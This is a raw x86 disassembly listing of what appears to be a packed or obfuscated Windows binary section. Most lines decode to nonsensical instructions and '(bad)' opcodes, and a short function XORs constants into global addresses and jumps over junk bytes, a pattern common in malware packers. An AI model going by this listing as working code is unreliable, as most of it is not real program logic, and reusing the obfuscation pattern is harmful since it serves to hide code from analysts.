  4094e2:	mov    WORD PTR [edi],ds
  4094e4:	leave  
  4094e5:	cli    
  4094e6:	mov    DWORD PTR [edx+0x1807b572],edi
  4094ec:	sub    ebp,DWORD PTR [edx]
  4094ee:	dec    edi
  4094ef:	mov    ebx,DWORD PTR [ebp+0x5c]
  4094f2:	dec    edx
  4094f3:	and    BYTE PTR [esi],bh
  4094f5:	pop    esp
  4094f6:	pop    esi
  4094f7:	stos   DWORD PTR es:[edi],eax
  4094f8:	retf   
  4094f9:	arpl   WORD PTR [edx-0x77d060c0],bp
  4094ff:	scas   eax,DWORD PTR es:[edi]
  409500:	cmp    BYTE PTR [edi],dl
  409502:	mov    ss,WORD PTR es:[eax+0x75]
  409506:	fsub   QWORD PTR [ebp+0x57]
  409509:	and    esp,ecx
  40950b:	(bad)  
  40950c:	sti    
  40950d:	int    0x3b
  40950f:	or     eax,0x814118c7
  409514:	cmp    al,0x5
  409516:	(bad)  
  409517:	addr16 mov dh,0xb0
  40951a:	imul   edx,DWORD PTR [edi+0x44],0x2783c93
  409521:	and    dh,BYTE PTR [esi-0x3bf2d91f]
  409527:	(bad)  
  409528:	xchg   ecx,eax
  409529:	mov    ebx,0xa0661441
  40952e:	xor    eax,0x8dd92c08
  409533:	and    bh,BYTE PTR ss:[edx]
  409536:	add    esp,DWORD PTR [edx]
  409538:	mov    esi,esi
  40953a:	cmp    cl,ch
  40953c:	fcmovu st,st(2)
  40953e:	mov    edx,0xca152b14
  409543:	bound  ebx,QWORD PTR [eax]
  409545:	xchg   esi,eax
  409546:	jnp    0x4095bc
  409548:	test   DWORD PTR [esp+ecx*4+0x3b],edi
  40954c:	(bad)  [edi-0x2d255c0a]
  409552:	pop    edi
  409553:	out    dx,al
  409554:	inc    ecx
  409555:	(bad)  
  409556:	in     al,dx
  409557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409558:	scas   al,BYTE PTR es:[edi]
  409559:	int    0x9d
  40955b:	out    0x19,al
  40955d:	dec    ecx
  40955e:	je     0x409520
  409560:	aad    0x8a
  409562:	mov    ss,WORD PTR ds:0xf76c6b44
  409568:	sub    al,0x96
  40956a:	xchg   ebp,eax
  40956b:	stos   BYTE PTR es:[edi],al
  40956c:	addr16 cmp dl,bh
  40956f:	mov    eax,ds:0x11e8febb
  409574:	call   0x167e:0x1677f375
  40957b:	aaa    
  40957c:	mov    eax,ds:0xfa9b2634
  409581:	lahf   
  409582:	and    eax,esi
  409584:	outs   dx,DWORD PTR ds:[esi]
  409585:	add    ebx,DWORD PTR ds:0xa82d6e89
  40958b:	mov    ebx,DWORD PTR [eax-0x2130f26f]
  409591:	jae    0x40959c
  409593:	cmp    DWORD PTR [ebp+eax*1+0x17f4942],esi
  40959a:	imul   edi
  40959c:	ds mov bh,0x15
  40959f:	daa    
  4095a0:	xor    ebx,DWORD PTR [esi+ebx*8-0x69]
  4095a4:	pop    es
  4095a5:	and    eax,DWORD PTR [edi+0x4d588106]
  4095ab:	dec    eax
  4095ac:	adc    DWORD PTR [edi+esi*1-0x6a],ebx
  4095b0:	mov    esi,0xcd254755
  4095b6:	bound  ebx,QWORD PTR ds:0xe5e6741d
  4095bc:	xor    al,0xb2
  4095be:	pop    ds
  4095bf:	sub    al,0xc1
  4095c1:	mov    DWORD PTR [ebx+0x3e63b0f1],edx
  4095c7:	in     eax,dx
  4095c8:	push   esi
  4095c9:	loop   0x4095e1
  4095cb:	loop   0x409603
  4095cd:	lds    ebp,FWORD PTR [ecx+0x849d35a]
  4095d3:	mov    bl,0x95
  4095d5:	mov    ah,0xdd
  4095d7:	pop    ss
  4095d8:	ret    0x3197
  4095db:	and    bh,BYTE PTR [ecx+ebx*8]
  4095de:	mov    ecx,0x87c20914
  4095e3:	icebp  
  4095e4:	out    0xa1,eax
  4095e6:	in     al,dx
  4095e7:	pop    ss
  4095e8:	in     al,0x48
  4095ea:	call   0x406b0f
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8eba:0x9f20294e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	inc    ebx
  40960d:	jmp    0x8b6c4dd9
  409612:	aad    0xf7
  409614:	mov    esi,0xf2c15c67
  409619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40961a:	cwde   
  40961b:	icebp  
  40961c:	jno    0x409649
  40961e:	loopne 0x4095f9
  409620:	call   0x8e5eb058
  409625:	pop    ds
  409626:	into   
  409627:	add    ebp,DWORD PTR [ebx-0x51]
  40962a:	sub    ch,dl
  40962c:	mov    DWORD PTR [esi-0x1d3648f6],0xdd136d51
  409636:	(bad)  
  409637:	inc    edi
  409638:	mov    ch,0xc1
  40963a:	xor    esp,DWORD PTR [ebp-0x75]
  40963d:	add    eax,esp
  40963f:	inc    esi
  409640:	outs   dx,BYTE PTR ds:[esi]
  409641:	mov    ah,0x17
  409643:	ficomp DWORD PTR [edi]
  409645:	fwait
  409646:	adc    eax,0xf4467034
  40964b:	pop    es
  40964c:	mov    al,0x9c
  40964e:	cmp    DWORD PTR [eax+esi*2],0xffffffec
  409652:	rcr    cl,1
  409654:	or     eax,0xf529483e
  409659:	sub    esi,DWORD PTR [eax-0x284c2294]
  40965f:	jl     0x409690
  409661:	ss pop ss
  409663:	inc    edi
  409664:	xchg   ebp,eax
  409665:	ins    BYTE PTR es:[edi],dx
  409666:	jp     0x40965c
  409668:	std    
  409669:	mov    bh,0xa
  40966b:	jg     0x409640
  40966d:	cdq    
  40966e:	int    0x5c
  409670:	push   ds
  409671:	push   0xffffffe1
  409673:	dec    esi
  409674:	cwde   
  409675:	inc    edx
  409676:	int3   
  409677:	add    DWORD PTR [edi],ebp
  409679:	jne    0x4095ff
  40967b:	mov    ecx,ebp
  40967d:	push   es
  40967e:	xor    eax,0x3f5b953e
  409683:	loope  0x40966b
  409685:	pop    gs
  409687:	imul   esp,DWORD PTR [esi+0x57b4634],0xe0577404
  409691:	sbb    ebp,DWORD PTR [edi+0x7a]
  409694:	cmp    ah,ah
  409696:	sub    DWORD PTR [ebx+0x2ecb73d6],esi
  40969c:	add    ebx,edx
  40969e:	lahf   
  40969f:	leave  
  4096a0:	in     al,0xd2
  4096a2:	call   0x937ac602
  4096a7:	aaa    
  4096a8:	sbb    esp,esi
  4096aa:	sbb    BYTE PTR [ebx-0x6c5b9274],dl
  4096b0:	sub    bh,al
  4096b2:	sbb    DWORD PTR [edx],ecx
  4096b4:	xchg   ecx,eax
  4096b5:	inc    edi
  4096b6:	or     eax,0xfffffff5
  4096b9:	mov    bh,0xc1
  4096bb:	cmp    ecx,DWORD PTR [ebp+0x824e79]
  4096c1:	mov    eax,ds:0x4d65529d
  4096c6:	sbb    DWORD PTR [edi-0x23099379],ebp
  4096cc:	jp     0x409665
  4096ce:	xor    BYTE PTR [esi+ebp*8+0x12f925c0],al
  4096d5:	or     al,0x96
  4096d7:	adc    al,0x63
  4096d9:	retf   
  4096da:	and    al,0x8b
  4096dc:	test   di,0xd2b9
  4096e1:	inc    esi
  4096e2:	add    dl,ah
  4096e4:	sub    dh,BYTE PTR [ebp+0x5ec1e9af]
  4096ea:	cmc    
  4096eb:	mov    ebp,0x140f8297
  4096f0:	xchg   ebp,eax
  4096f1:	xor    al,0xb0
  4096f3:	dec    eax
  4096f4:	xchg   edi,eax
  4096f5:	and    al,BYTE PTR gs:[edi-0x47]
  4096f9:	call   0x35e1:0x78ab011
  409700:	xchg   DWORD PTR [ecx+0x7b7e04f2],esi
  409706:	ja     0x4096e2
  409708:	sub    al,0x6f
  40970a:	jle    0x40974c
  40970c:	int    0x3b
  40970e:	mov    dl,BYTE PTR [edi+0x20]
  409711:	aaa    
  409712:	jns    0x4096b3
  409714:	sbb    esi,DWORD PTR ds:0xdcc729a3
  40971a:	inc    esi
  40971b:	int3   
  40971c:	aaa    
  40971d:	mov    bh,0xa1
  40971f:	dec    esp
  409720:	daa    
  409721:	or     eax,0x842c1d67
  409726:	mov    edi,0xd2f460c2
  40972b:	mov    ch,0x10
  40972d:	jne    0x4096d7
  40972f:	sahf   
  409730:	sbb    DWORD PTR [eax+0x3cd50db7],ebp
  409736:	cdq    
  409737:	jmp    0x14ca:0x580d0962
  40973e:	xlat   BYTE PTR ds:[ebx]
  40973f:	shr    ecx,cl
  409741:	jo     0x4096ca
  409743:	dec    ebp
  409744:	icebp  
  409745:	mov    ds:0xbcf4e117,eax
  40974a:	sbb    al,0x68
  40974c:	test   al,0xdc
  40974e:	mov    cl,0x9b
  409750:	scas   al,BYTE PTR es:[edi]
  409751:	inc    edi
  409752:	cmp    al,0x18
  409754:	test   BYTE PTR [edi],ch
  409756:	dec    edx
  409757:	xor    DWORD PTR [ebp+0x596e9942],ecx
  40975d:	test   eax,0xfec50bde
  409763:	imul   ebp,DWORD PTR ds:[esi],0xffffffa2
  409767:	ss mov ecx,0x7c46e0db
  40976d:	addr16 mov al,0x63
  409770:	cmp    DWORD PTR [ebp+0x61852f64],esi
  409776:	lods   al,BYTE PTR ds:[esi]
  409777:	xor    ecx,ebp
  409779:	and    eax,0x71fc8845
  40977e:	imul   ebp,DWORD PTR [edi],0x9c5eb761
  409784:	jbe    0x40978c
  409786:	std    
  409787:	add    eax,DWORD PTR [edi]
  409789:	(bad)  
  40978b:	or     DWORD PTR ds:0x7bae7ec1,ebx
  409791:	imul   ecx,DWORD PTR [ecx-0x268b5401],0x9ff1913f
  40979b:	in     al,dx
  40979c:	(bad)  
  40979d:	in     eax,0x44
  40979f:	adc    al,BYTE PTR [ebp-0x21]
  4097a2:	sbb    al,0x1b
  4097a4:	mov    eax,ds:0x5e5671bd
  4097a9:	neg    BYTE PTR [eax]
  4097ab:	std    
  4097ac:	jl     0x40974d
  4097ae:	int    0x9c
  4097b0:	sbb    al,0x4f
  4097b2:	push   ss
  4097b3:	dec    ebx
  4097b4:	mov    esi,0x63a2eacd
  4097b9:	lock mov dl,0x5c
  4097bc:	xor    BYTE PTR [esi-0x3d3a4bb5],bl
  4097c2:	pop    esi
  4097c3:	rcr    DWORD PTR [ebx-0x599d3b12],1
  4097c9:	push   edi
  4097ca:	push   ebx
  4097cb:	inc    ebp
  4097cc:	sbb    cl,bl
  4097ce:	nop
  4097cf:	ret    0xc8b1
  4097d2:	jecxz  0x4097b7
  4097d4:	dec    edx
  4097d5:	leave  
  4097d6:	mov    esi,0xde393ae9
  4097db:	inc    eax
  4097dc:	stc    
  4097dd:	jmp    0x409814
  4097df:	mov    eax,DWORD PTR [esi+ebx*2-0xe]
  4097e3:	jb     0x409777
  4097e5:	stc    
  4097e6:	out    dx,al
  4097e7:	xor    eax,0x92b6bbff
  4097ec:	out    dx,al
  4097ed:	adc    BYTE PTR [esi],bh
  4097ef:	mov    edi,0x4fe76d29
  4097f4:	xor    esi,DWORD PTR [edi+0x3c]
  4097f7:	jmp    FWORD PTR [ebx+eax*4+0x55bfdf16]
  4097fe:	dec    edx
  4097ff:	hlt    
  409800:	pop    eax
  409801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409802:	or     eax,0xba7481e7
  409807:	sbb    al,0x67
  409809:	xor    ebp,DWORD PTR [eax-0x56]
  40980c:	fst    QWORD PTR [ebp-0x599f0fea]
  409812:	int3   
  409813:	cmc    
  409814:	xlat   BYTE PTR ds:[ebx]
  409815:	dec    ecx
  409816:	mov    ebp,fs
  409818:	cmp    eax,0x971e384d
  40981d:	mov    ah,bh
  40981f:	repnz mov eax,ds:0x96bb15aa
  409825:	add    esp,edi
  409827:	sbb    dl,BYTE PTR [eax+0x58]
  40982a:	loopne 0x4098a8
  40982c:	pop    edx
  40982d:	pop    ss
  40982e:	pushf  
  40982f:	add    eax,0xa68b9fdc
  409834:	leave  
  409835:	jnp    0xc37c8c80
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x43385f
  40986f:	xor    DWORD PTR ds:0x433797,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x43385b,0x43382b
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x4337e7,0x433893
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x43377b
  4098a6:	sub    DWORD PTR ds:0x43385f,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	mov    dl,0xae
  4098c2:	xchg   BYTE PTR [edx],bl
  4098c4:	mov    ah,0xd9
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	test   BYTE PTR [edx+0x55],dl
  4098cf:	mov    esi,0xc2b37df7
  4098d4:	mov    gs,esp
  4098d6:	(bad)  
  4098d7:	retf   0xbcce
  4098da:	idiv   BYTE PTR [ebp+0x7e2b6989]
  4098e0:	call   0xf995:0xa3bd8bd4
  4098e7:	mov    ah,0x1c
  4098e9:	loop   0x40994c
  4098eb:	push   ss
  4098ec:	js     0x409936
  4098ee:	aas    
  4098ef:	xchg   ebx,eax
  4098f0:	pop    eax
  4098f1:	leave  
  4098f2:	shld   DWORD PTR [esi+0x351fac30],edx,0x1
  4098fa:	hlt    
  4098fb:	rol    BYTE PTR [ebx],0xf1
  4098fe:	jl     0x409899
  409900:	lahf   
  409901:	mov    BYTE PTR [ebx+0x13],bh
  409904:	sbb    cl,cl
  409906:	hlt    
  409907:	das    
  409908:	xor    al,0x51
  40990a:	jle    0x409905
  40990c:	push   0xba0192e3
  409911:	push   eax
  409912:	xchg   edi,eax
  409913:	mov    bl,0xdf
  409915:	push   0xae38d703
  40991a:	and    DWORD PTR [ebp+0x33fe97ca],ebp
  409920:	mov    edi,0xa66ae8ba
  409925:	popf   
  409926:	(bad)  [edx-0x36]
  409929:	fadd   QWORD PTR [ecx-0x7a46ab53]
  40992f:	or     BYTE PTR [edi],bl
  409931:	sub    al,0xa9
  409933:	mov    BYTE PTR [ecx],ah
  409935:	xchg   esp,eax
  409936:	fdivr  QWORD PTR [ecx+0x22]
  409939:	aaa    
  40993a:	lds    edi,FWORD PTR [edi]
  40993c:	fdivr  DWORD PTR [edi]
  40993e:	mov    DWORD PTR [edx+0x1d],eax
  409941:	std    
  409942:	jno    0x409957
  409944:	pop    esp
  409945:	int    0x27
  409947:	xchg   BYTE PTR [ecx-0x36f04c22],cl
  40994d:	icebp  
  40994e:	pop    ecx
  40994f:	mov    dh,0x69
  409951:	js     0x4099a4
  409953:	test   BYTE PTR [ebx],al
  409955:	xor    ch,al
  409957:	or     al,0xef
  409959:	clc    
  40995a:	and    dl,dh
  40995c:	or     DWORD PTR [edi],0xffffffc2
  40995f:	pop    edi
  409960:	xlat   BYTE PTR ds:[ebx]
  409961:	add    ch,BYTE PTR [eax-0x7093b9c7]
  409967:	push   ds
  409968:	test   BYTE PTR [ecx],0xa9
  40996b:	ja     0x4099c8
  40996d:	das    
  40996e:	test   BYTE PTR [eax-0x733ce364],al
  409974:	in     al,dx
  409975:	mov    ecx,0x9e12969b
  40997a:	(bad)  
  40997c:	mov    esi,0x4b23a71
  409981:	inc    ebx
  409982:	mov    bh,0x25
  409984:	adc    BYTE PTR [ebp-0x31],al
  409987:	mov    ds:0xb821749b,al
  40998c:	cld    
  40998d:	div    BYTE PTR [edi-0x27]
  409990:	lds    eax,FWORD PTR [edi-0x15]
  409993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409994:	loope  0x4099a8
  409996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409997:	xor    ch,ch
  409999:	in     al,dx
  40999a:	not    esi
  40999c:	mov    ebp,0xa74d52c1
  4099a1:	push   eax
  4099a2:	popa   
  4099a3:	test   al,0x2f
  4099a5:	jbe    0x40998e
  4099a7:	pop    esp
  4099a8:	sar    DWORD PTR [ecx],cl
  4099aa:	ss or  edx,ecx
  4099ad:	sti    
  4099ae:	lods   eax,DWORD PTR ds:[esi]
  4099af:	or     al,0x5c
  4099b1:	jg     0x40996f
  4099b3:	(bad)  
  4099b4:	jmp    0x3b7b:0xa50ab4a6
  4099bb:	push   eax
  4099bc:	add    ecx,DWORD PTR ds:[esi]
  4099bf:	lock stc 
  4099c1:	lea    ebp,[eax-0x357d0c67]
  4099c7:	jae    0x409a16
  4099c9:	pop    eax
  4099ca:	mov    dl,bl
  4099cc:	mov    ecx,0x79aaed83
  4099d1:	push   0x16
  4099d3:	sub    DWORD PTR [ecx-0x6],edx
  4099d6:	dec    edx
  4099d7:	inc    ebx
  4099d8:	jns    0x409a21
  4099da:	lahf   
  4099db:	pop    es
  4099dc:	adc    DWORD PTR [esi+esi*2-0x4f],0xd8c6fbfd
  4099e4:	dec    eax
  4099e5:	sub    DWORD PTR ds:0x19b76c0b,0xffffffc8
  4099ec:	nop
  4099ed:	pop    eax
  4099ee:	(bad)  
  4099ef:	(bad)  
  4099f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099f1:	adc    eax,0x291cd30a
  4099f6:	mov    BYTE PTR [ebx+0x3f9a50a8],0xa8
  4099fd:	sbb    eax,0xa3c610a
  409a02:	dec    ecx
  409a03:	mov    bh,0xa4
  409a05:	cmp    eax,0x824173dd
  409a0a:	inc    ecx
  409a0b:	int    0x7f
  409a0d:	fild   QWORD PTR [ecx-0x4f]
  409a10:	push   esi
  409a11:	call   0xe97e:0x269b626d
  409a18:	pushf  
  409a19:	xchg   edx,edx
  409a1b:	or     DWORD PTR [ecx],0xffffffa2
  409a1e:	inc    esi
  409a1f:	xor    BYTE PTR [ecx*8-0xbb0a378],ch
  409a26:	jmp    0x173:0x64fe68
  409a2d:	adc    al,BYTE PTR [ecx+eax*1-0x51cc0e26]
  409a34:	jo     0x409a69
  409a36:	std    
  409a37:	je     0x4099c2
  409a39:	pushf  
  409a3a:	or     DWORD PTR [eax],esp
  409a3c:	stc    
  409a3d:	addr16 into 
  409a3f:	(bad)  
  409a40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a41:	add    esi,DWORD PTR [edx]
  409a43:	inc    edx
  409a44:	(bad)  
  409a45:	mov    ds:0xc06055a9,al
  409a4a:	xor    edx,DWORD PTR [edx]
  409a4c:	scas   eax,DWORD PTR es:[edi]
  409a4d:	inc    esi
  409a4e:	or     al,0x14
  409a50:	lods   al,BYTE PTR ds:[esi]
  409a51:	rol    DWORD PTR [edx+eax*4+0x4c0bd0fd],1
  409a58:	jne    0x409a35
  409a5a:	mov    ch,0xa5
  409a5c:	xor    DWORD PTR [edx+0x43],ecx
  409a5f:	add    eax,0x7edf5c3
  409a64:	stos   BYTE PTR es:[edi],al
  409a65:	cld    
  409a66:	outs   dx,BYTE PTR ds:[esi]
  409a67:	sti    
  409a68:	adc    edi,DWORD PTR [ecx+0x4b7aeb1e]
  409a6e:	sub    BYTE PTR [eax],bl
  409a70:	enter  0x27df,0x8b
  409a74:	lds    eax,FWORD PTR [ebp+0x6ba18f21]
  409a7a:	daa    
  409a7b:	les    edx,FWORD PTR [esp+eax*1-0x30]
  409a7f:	loop   0x409a3e
  409a81:	mov    ds:0xd2d35a53,al
  409a86:	ins    DWORD PTR es:[edi],dx
  409a87:	xor    al,0x6
  409a89:	and    eax,0x7f79dc81
  409a8e:	jp     0x409ac4
  409a90:	leave  
  409a91:	mov    ah,0x66
  409a93:	push   ss
  409a94:	or     eax,0x5402b0f1
  409a99:	mov    ds:0xf34727ba,eax
  409a9e:	in     al,dx
  409a9f:	pop    ebx
  409aa0:	fnstsw WORD PTR [edx+0x69309e3b]
  409aa6:	cmp    al,BYTE PTR [ebp+0x261fd4dd]
  409aac:	sahf   
  409aad:	aam    0x18
  409aaf:	mov    ah,dl
  409ab1:	inc    esp
  409ab2:	loop   0x409a40
  409ab4:	xor    BYTE PTR ds:0x1c298a8d,bh
  409aba:	mov    eax,ds:0x78c1806c
  409abf:	pop    ds
  409ac0:	xor    BYTE PTR ds:0x324a106a,al
  409ac6:	xor    bh,BYTE PTR [esi]
  409ac8:	arpl   WORD PTR [edx],sp
  409aca:	xchg   esp,eax
  409acb:	in     eax,dx
  409acc:	cwde   
  409acd:	push   ecx
  409ace:	jns    0x409b0d
  409ad0:	xor    BYTE PTR es:[ecx+0x3c],dl
  409ad4:	cdq    
  409ad5:	ins    BYTE PTR es:[edi],dx
  409ad6:	jmp    0xd94f2c0
  409adb:	mov    esi,0x589353f7
  409ae0:	cmp    dl,dl
  409ae2:	push   0x7368f5d9
  409ae7:	sbb    ch,BYTE PTR [eax]
  409ae9:	sbb    ax,0xc46f
  409aed:	xchg   BYTE PTR [edx],bh
  409aef:	xchg   ecx,eax
  409af0:	adc    BYTE PTR [ecx-0x4e],ch
  409af3:	or     dh,BYTE PTR [eax+0x1f]
  409af6:	jge    0x409b55
  409af8:	xor    dh,BYTE PTR [ecx+0x30]
  409afb:	pop    esp
  409afc:	test   eax,0x8d022c2
  409b01:	mov    al,0x0
  409b03:	fldenv [esi+0x41]
  409b06:	mov    bl,cl
  409b08:	stos   BYTE PTR es:[edi],al
  409b09:	stos   DWORD PTR es:[edi],eax
  409b0a:	mul    esi
  409b0c:	lea    esi,[esi+0x47dba5cf]
  409b12:	push   esi
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43381f,0x4337d3
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi-0x7eaac12c]
  409b32:	dec    esp
  409b33:	jle    0x409b19
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	(bad)  
  409b3c:	mov    ebx,0xefb5ce7d
  409b41:	push   es
  409b42:	je     0x409ad5
  409b44:	(bad)  
  409b45:	jno    0x409b2d
  409b47:	inc    ebp
  409b48:	ja     0x409b96
  409b4a:	dec    esi
  409b4b:	ins    DWORD PTR es:[edi],dx
  409b4c:	ret    
  409b4d:	je     0x409b17
  409b4f:	cmp    esi,ebp
  409b51:	(bad)  
  409b53:	inc    esi
  409b54:	mov    dl,0x47
  409b56:	sti    
  409b57:	adc    bh,BYTE PTR [eax+0x464c2e0c]
  409b5d:	mov    eax,0xf6600635
  409b62:	je     0x409b75
  409b64:	fwait
  409b65:	dec    ebp
  409b66:	ins    DWORD PTR es:[edi],dx
  409b67:	xor    DWORD PTR [ebx],0xd7bc13f0
  409b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b6e:	sahf   
  409b6f:	inc    eax
  409b70:	sahf   
  409b71:	cli    
  409b72:	push   cs
  409b73:	addr16 jne 0x409ba8
  409b76:	sbb    DWORD PTR [edi-0x4d30a014],esi
  409b7c:	mov    bl,BYTE PTR [edi+0x73d97326]
  409b82:	ins    DWORD PTR es:[edi],dx
  409b83:	cwde   
  409b84:	push   0x17
  409b86:	test   al,0x38
  409b88:	sbb    DWORD PTR [ebp-0x5af546c2],ebx
  409b8e:	sbb    eax,0x75081ea2
  409b93:	out    0x2d,eax
  409b95:	lahf   
  409b96:	push   cs
  409b97:	ficom  DWORD PTR [ecx+0x2b]
  409b9a:	mov    ebp,0x7d7350a8
  409b9f:	das    
  409ba0:	into   
  409ba1:	(bad)  
  409ba2:	cdq    
  409ba3:	mov    DWORD PTR [edi+0x6],edi
  409ba6:	sub    dh,BYTE PTR [edi]
  409ba8:	mov    DWORD PTR [ebp-0x53975ea1],0x17037b20
  409bb2:	ror    BYTE PTR [edi-0x6c38b2b],0x22
  409bb9:	pop    ss
  409bba:	sub    al,0x64
  409bbc:	cmp    DWORD PTR [edx-0x2],ecx
  409bbf:	fisttp QWORD PTR [eax-0x50]
  409bc2:	fadd   QWORD PTR [esi]
  409bc4:	fbstp  TBYTE PTR [edi-0x51]
  409bc7:	sub    eax,0x9975eae7
  409bcc:	inc    esi
  409bcd:	and    esp,DWORD PTR [edi+0x741da1c6]
  409bd3:	inc    esp
  409bd4:	mov    al,0x13
  409bd6:	out    dx,al
  409bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bd8:	leave  
  409bd9:	rcr    DWORD PTR [ebx],cl
  409bdb:	int3   
  409bdc:	inc    ecx
  409bdd:	imul   DWORD PTR [esi+0x66]
  409be0:	ret    0x5ec5
  409be3:	mov    dl,0x82
  409be5:	jb     0x409c53
  409be7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409be8:	out    0xde,al
  409bea:	push   ecx
  409beb:	sti    
  409bec:	jno    0x409c36
  409bee:	add    al,0x7e
  409bf0:	imul   esp,ecx,0xffffff9e
  409bf3:	and    bl,BYTE PTR [eax+0x73adbfbc]
  409bf9:	test   al,0x5c
  409bfb:	sub    al,0x49
  409bfd:	cdq    
  409bfe:	jmp    0x409c4d
  409c00:	pop    edx
  409c01:	stc    
  409c02:	mov    eax,0xf37fbf2d
  409c07:	imul   edi,DWORD PTR [ecx-0x6b],0x7b997b40
  409c0e:	push   ebx
  409c0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c10:	adc    DWORD PTR [ecx],ecx
  409c12:	push   edx
  409c13:	inc    ecx
  409c14:	hlt    
  409c15:	stos   DWORD PTR es:[edi],eax
  409c16:	dec    esp
  409c17:	bound  edi,QWORD PTR [ecx+0x65c95bc]
  409c1d:	xchg   al,cl
  409c1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c20:	bound  ecx,QWORD PTR [esi+edx*4+0x48]
  409c24:	lods   al,BYTE PTR ds:[esi]
  409c25:	sti    
  409c26:	gs sti 
  409c28:	ss xchg esp,eax
  409c2a:	inc    esi
  409c2b:	and    dl,0x1c
  409c2e:	jg     0x409c37
  409c30:	nop
  409c31:	data16 mov al,ds:0x25b18338
  409c37:	jmp    0x409c1a
  409c39:	and    al,0x5b
  409c3b:	fcomp  QWORD PTR [esp+ebp*2+0x3443fce6]
  409c42:	or     ah,ch
  409c44:	pop    esi
  409c45:	shl    BYTE PTR [edx-0x3d],0xca
  409c49:	mov    ds:0x8474bec9,al
  409c4e:	cdq    
  409c4f:	fs je  0x409ca4
  409c52:	jbe    0x409c5e
  409c54:	hlt    
  409c55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c56:	imul   edi,eax,0x9
  409c59:	dec    eax
  409c5a:	fdiv   DWORD PTR [esi+0x356908b4]
  409c60:	sbb    ebp,DWORD PTR [edx]
  409c62:	cli    
  409c63:	sbb    cl,ch
  409c65:	sub    ch,ch
  409c67:	ja     0x409be9
  409c69:	test   BYTE PTR [edi+ecx*4+0x1d],ch
  409c6d:	loope  0x409c0f
  409c6f:	inc    edx
  409c70:	push   edi
  409c71:	xchg   esi,eax
  409c72:	scas   al,BYTE PTR es:[edi]
  409c73:	mov    ds,edx
  409c75:	ficomp WORD PTR [edi]
  409c77:	repnz test BYTE PTR [edi-0x425e9bf8],al
  409c7e:	inc    esi
  409c7f:	jns    0x409c4a
  409c81:	cld    
  409c82:	(bad)  
  409c83:	icebp  
  409c84:	push   DWORD PTR [eax-0x44]
  409c87:	sar    BYTE PTR [ebx],1
  409c89:	mov    DWORD PTR [ebx],ebp
  409c8b:	pop    ecx
  409c8c:	mov    ah,0xa9
  409c8e:	popa   
  409c8f:	fidiv  DWORD PTR [eax+0x453ce1fc]
  409c95:	repnz lahf 
  409c97:	outs   dx,DWORD PTR ds:[esi]
  409c98:	aad    0x55
  409c9a:	mov    cl,0x6c
  409c9c:	test   eax,0xdb32383d
  409ca1:	sub    al,0x1
  409ca3:	mov    ebp,0xf870ae19
  409ca8:	cwde   
  409ca9:	jmp    0xed1439e8
  409cae:	ror    ebx,1
  409cb0:	mov    eax,ds:0x35e9b1f0
  409cb5:	mov    eax,ds:0xbdd6df04
  409cba:	add    eax,0xc044fafa
  409cbf:	cs out 0x80,eax
  409cc2:	jae    0x409cb8
  409cc4:	xor    al,0x13
  409cc6:	or     al,0xee
  409cc8:	mov    ebp,DWORD PTR [esi+0x7e4634ce]
  409cce:	mov    bh,0xaf
  409cd0:	dec    edi
  409cd1:	sub    esp,edi
  409cd3:	jmp    0x409cf8
  409cd5:	mov    dl,0xce
  409cd7:	call   0x1433ef91
  409cdc:	ror    BYTE PTR [eax],1
  409cde:	vpsrad xmm5,xmm0,xmm7
  409ce2:	fsubr  DWORD PTR [eax+0x5e]
  409ce5:	cmp    al,BYTE PTR [ecx]
  409ce7:	pop    ecx
  409ce8:	mov    edx,0x23efaf61
  409ced:	call   0xa3d1:0xf264c86
  409cf4:	lds    esp,FWORD PTR [ebx]
  409cf6:	cmp    DWORD PTR [ebp-0xabd827b],ebp
  409cfc:	jmp    0xee4e:0x21bdaddb
  409d03:	loop   0x409d33
